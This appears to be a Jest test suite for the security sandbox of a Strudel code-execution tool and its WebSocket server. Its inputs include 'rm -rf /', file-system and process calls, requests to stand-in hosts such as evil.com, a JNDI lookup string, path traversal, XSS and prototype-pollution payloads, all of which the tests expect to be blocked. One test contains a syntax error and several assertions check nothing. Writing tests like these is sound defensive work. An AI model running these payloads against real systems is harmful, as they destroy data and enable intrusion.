import { ExecuteStrudelCodeTool } from '../src/mcp/tools'
import { WebSocketManager } from '../src/websocket/manager'

// Mock WebSocket for testing
class MockWebSocket extends EventEmitter {
  readyState = 1 // WebSocket.OPEN
  sent: string[] = []

  send(data: string) {
    this.sent.push(data)
    this.emit('sent', data)
  }

  close() {
    this.readyState = 3 // WebSocket.CLOSED
    this.emit('close')
  }
}

// Mock Server
class MockServer extends EventEmitter {
  constructor() {
    super()
  }
}

describe('Security Boundary Testing', () => {
  let executeTool: ExecuteStrudelCodeTool
  let wsManager: WebSocketManager
  let mockServer: MockServer

  beforeEach(() => {
    executeTool = new ExecuteStrudelCodeTool()
    mockServer = new MockServer()
    wsManager = new WebSocketManager(mockServer as any)
  })

  afterEach(() => {
    wsManager.removeAllListeners()
    mockServer.removeAllListeners()
  })

  describe('Code Injection Prevention', () => {
    test('should block file system access attempts', async () => {
      const dangerousCodes = [
        'require("fs").readFileSync("/")',
        'require("fs").writeFileSync("test.txt", "malicious")',
        'const fs = require("fs"); fs.readdirSync("/")',
        'import fs from "fs"; fs.writeFileSync("hack.txt", "data")',
        'global.require("fs").readFileSync("/")'
      ]

      for (const code of dangerousCodes) {
        const result = await executeTool.call({ code })
        expect(result.status).toBe('error')
        expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
      }
    })

    test('should block process manipulation attempts', async () => {
      const dangerousCodes = [
        'process.exit(0)',
        'process.kill(process.pid)',
        'process.abort()',
        'process.env.SECRET = "hacked"',
        'delete process.env.NODE_ENV',
        'process.chdir("/")'
      ]

      for (const code of dangerousCodes) {
        const result = await executeTool.call({ code })
        expect(result.status).toBe('error')
        expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
      }
    })

    test('should block child process execution', async () => {
      const dangerousCodes = [
        'require("child_process").exec("rm -rf /")',
        'require("child_process").spawn("ls", ["-la"])',
        'require("child_process").fork("malicious.js")',
        'import { exec } from "child_process"; exec("echo hacked")',
        'global.require("child_process").exec("whoami")'
      ]

      for (const code of dangerousCodes) {
        const result = await executeTool.call({ code })
        expect(result.status).toBe('error')
        expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
      }
    })

    test('should block eval and dynamic code execution', async () => {
      const dangerousCodes = [
        'eval("require(\'fs\').readFileSync(\'/\')")',
        'new Function("require(\'fs\').readFileSync(\'/\')")()',
        'setTimeout("require(\'fs\').readFileSync(\'/\')", 0)',
        'setInterval("require(\'child_process\').exec(\'ls\')", 100)',
        'Function("return this")().require("fs")'
      ]

      for (const code of dangerousCodes) {
        const result = await executeTool.call({ code })
        expect(result.status).toBe('error')
        expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
      }
    })

    test('should block network access attempts', async () => {
      const dangerousCodes = [
        'require("http").get("http://malicious.com")',
        'require("https").request("https://evil.com")',
        'require("net").connect(80, "evil.com")',
        'require("dns").lookup("evil.com")',
        'fetch("http://malicious.com")',
        'import http from "http"; http.get("http://example.com")'
      ]

      for (const code of dangerousCodes) {
        const result = await executeTool.call({ code })
        expect(result.status).toBe('error')
        expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
      }
    })

    test('should block module system manipulation', async () => {
      const dangerousCodes = [
        'require.main.require("fs")',
        'module.exports = require("fs")',
        'module.parent.require("child_process")',
        'require.cache[require.resolve("fs")] = {}',
        'Module._load("fs", module, false)',
        'global.require = function() { return require("fs") }'
      ]

      for (const code of dangerousCodes) {
        const result = await executeTool.call({ code })
        expect(result.status).toBe('error')
        expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
      }
    })
  })

  describe('Input Sanitization', () => {
    test('should handle malicious string inputs', async () => {
      const maliciousStrings = [
        '../../../etc/passwd',
        'C:\\Windows\\System32\\cmd.exe',
        '<script>alert("xss")</script>',
        'rm -rf /',
        'SELECT * FROM users',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}',
        '%{#context.stop()}'
      ]

      for (const maliciousString of maliciousStrings) {
        const code = `s("${maliciousString}")`
        const result = await executeTool.call({ code })
        
        // Should handle malicious strings safely (either execute safely or block)
        expect(result).toBeDefined()
        expect(result.status === 'executed' || result.status === 'error')
      }
    })

    test('should handle extremely long inputs', async () => {
      const longString = 'a'.repeat(1000000) // 1MB string
      const code = `s("${longString}")`
      
      const result = await executeTool.call({ code })
      expect(result).toBeDefined()
      // Should either execute or fail gracefully, not crash
    })

    test('should handle Unicode and special character attacks', async () => {
      const attackStrings = [
        '\x00\x01\x02\x03', // Null bytes
        '\u202e\u202d\u202c', // Directional override
        '\ufeff\ufffe\ufffd', // Special Unicode
        '𝕳𝖊𝖑𝖑𝖔', // Mathematical script
        '😀😁😂🤣😃😄', // Emojis
        '中文測试', // Chinese
        'العربية', // Arabic
        'עברית' // Hebrew
      ]

      for (const attackString of attackStrings) {
        const code = `s("${attackString}")`
        const result = await executeTool.call({ code })
        
        expect(result).toBeDefined()
        expect(result.status === 'executed' || result.status === 'error')
      }
    })
  })

  describe('WebSocket Security', () => {
    test('should handle malicious WebSocket messages', (done) => {
      const maliciousMessages = [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        '{"type":"eval","code":"require(\'fs\').readFileSync(\'/\')"}',
        '{"type":"exec","command":"rm -rf /"}',
        'x'.repeat(1000000), // Large message DoS
        '\x00\x01\x02\x03', // Binary data
        '<script>alert("xss")</script>',
        '../../etc/passwd'
      ]

      let processedCount = 0

      wsManager.on('connect', (ws) => {
        const mockWs = ws as unknown as MockWebSocket
        
        maliciousMessages.forEach((message, index) => {
          setTimeout(() => {
            mockWs.emit('message', Buffer.from(message))
          }, index * 10)
        })
      })

      wsManager.on('message', (ws, data, clientId) => {
        processedCount++
        
        if (processedCount === maliciousMessages.length) {
          // Should handle all malicious messages without crashing
          expect(processedCount).toBe(maliciousMessages.length)
          done()
        }
      })

      const mockWs = new MockWebSocket('test-client') as any
      mockServer.emit('connection', mockWs)
    })

    test('should prevent WebSocket header injection', ( => {
      const maliciousHeaders = [
        'Connection: Upgrade\r\nUpgrade: websocket\r\nHost: evil.com',
        'Cookie: session= hacked',
        'Authorization: Bearer fake-token',
        'X-Forwarded-For: 127.0.0.1',
        'User-Agent: <script>alert("xss")</script>'
      ]

      // Verify WebSocket server doesn't process these as headers
      maliciousHeaders.forEach(header => {
        expect(() => {
          // Should not process these as actual headers
          wsManager.emit('connect', null, header)
        }).not.toThrow()
      })
    })

    test('should handle WebSocket flood attacks', (done) => {
      const floodCount = 1000
      let processedCount = 0

      wsManager.on('connect', (ws) => {
        const mockWs = ws as unknown as MockWebSocket
        
        // Flood with messages
        for (let i = 0; i < floodCount; i++) {
          mockWs.emit('message', Buffer.from(`{"id":${i}}`))
        }
      })

      wsManager.on('message', (ws, data, clientId) => {
        processedCount++
        
        if (processedCount === floodCount) {
          // Should handle flood without crashing
          expect(processedCount).toBe(floodCount)
          done()
        }
      })

      const mockWs = new MockWebSocket('test-client') as any
      mockServer.emit('connection', mockWs)
    }, 10000)
  })

  describe('Resource Limits', () => {
    test('should enforce memory limits', async () => {
      const memoryHungryCode = `
        const arrays = []
        for (let i = 0; i < 1000; i++) {
          arrays.push(new Array(10000).fill('x'))
        }
        s("bd hh")
      `

      const result = await executeTool.call({ code: memoryHungryCode })
      expect(result).toBeDefined()
      // Should either execute within limits or fail gracefully
    })

    test('should enforce execution time limits', async () => {
      const longRunningCode = `
        const start = Date.now()
        while (Date.now() - start < 5000) {
          // 5 second loop
        }
        s("bd hh")
      `

      const startTime = Date.now()
      const result = await executeTool.call({ code: longRunningCode })
      const endTime = Date.now()
      
      expect(result).toBeDefined()
      expect(endTime - startTime).toBeLessThan(10000) // Should complete within reasonable time
    })

    test('should prevent infinite loops', async () => {
      const infiniteLoopCodes = [
        'while (true) { s("bd hh") }',
        'for (;;) { s("bd hh") }',
        'const loop = () => loop(); loop()',
        'setInterval(() => s("bd hh"), 0)'
      ]

      for (const code of infiniteLoopCodes) {
        const startTime = Date.now()
        
        try {
          const result = await Promise.race([
            executeTool.call({ code }),
            new Promise((_, reject) => 
              setTimeout(() => reject(new Error('Timeout')), 3000)
            )
          ])
          
          const endTime = Date.now()
          expect(endTime - startTime).toBeLessThan(5000)
        } catch (error) {
          // Should timeout or be blocked
          expect(error.message).toBe('Timeout')
        }
      }
    })
  })

  describe('Context Isolation', () => {
    test('should not leak global variables', async () => {
      const globalVariableCode = `
        global.testVariable = "hacked"
        s("bd hh")
      `

      await executeTool.call({ code: globalVariableCode })
      
      // Verify global variable wasn't actually set
      expect((global as any).testVariable).toBeUndefined()
    })

    test('should not allow prototype pollution', async () => {
      const pollutionCodes = [
        'Object.prototype.admin = true',
        'Array.prototype.hacked = true',
        'Function.prototype.malicious = true',
        '{}.__proto__.polluted = true',
        'JSON.parse(\'{"__proto__":{"admin":true}}\')'
      ]

      for (const code of pollutionCodes) {
        await executeTool.call({ code })
        
        // Verify prototypes weren't polluted
        expect((Object.prototype as any).admin).toBeUndefined()
        expect((Array.prototype as any).hacked).toBeUndefined()
        expect((Function.prototype as any).malicious).toBeUndefined()
      }
    })

    test('should maintain context isolation between executions', async () => {
      const firstCode = `
        const localVariable = "first"
        s("bd hh")
      `

      const secondCode = `
        // Should not access variables from first execution
        if (typeof localVariable !== 'undefined') {
          throw new Error('Context leakage detected')
        }
        s("sd oh")
      `

      const result1 = await executeTool.call({ code: firstCode })
      const result2 = await executeTool.call({ code: secondCode })
      
      expect(result1.status).toBe('executed')
      expect(result2.status).toBe('executed')
    })
  })

  describe('Security Auditing', () => {
    test('should log security violations', async () => {
      const violationCode = 'require("fs").readFileSync("/")'
      
      // This should be logged as a security violation
      const result = await executeTool.call({ code: violationCode })
      
      expect(result.status).toBe('error')
      expect(result.error).toMatch(/dangerous|blocked|forbidden/i)
    })

    test('should audit execution attempts', async () => {
      const auditCodes = [
        's("bd hh")', // Normal
        'require("fs")', // Dangerous
        'invalid syntax {{{', // Invalid
        's("sd oh").fast(2)' // Normal
      ]

      for (const code of auditCodes) {
        const result = await executeTool.call({ code })
        expect(result).toBeDefined()
        expect(result.timestamp).toBeDefined()
      }
    })
  })
})
